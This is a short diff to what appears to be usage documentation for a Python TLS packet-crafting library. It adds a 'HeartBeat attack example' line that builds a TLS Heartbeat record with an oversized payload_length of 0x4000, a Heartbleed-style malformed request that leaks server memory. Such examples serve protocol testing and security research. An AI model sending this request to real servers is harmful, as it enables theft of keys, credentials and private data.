@@ -47,6 +47,10 @@ Idea
 	p = TLSRecord(version=TLSRecord.PROTOCOL_TLS_1_0)/TLSHandshake(version=TLSRecord.PROTOCOL_TLS_1_1, extensions=ext)
 	print tcp/Raw(data=p.serialize())
 	
-	
+	#
+	#
+	# HeartBeat attack example
+	print tcp/Raw(data=(TLSRecord(version=TLSRecord.PROTOCOL_TLS_1_1)/TLSHeartBeat(payload_length=0x4000)).serialize())
+	#
 	
  	- tintin
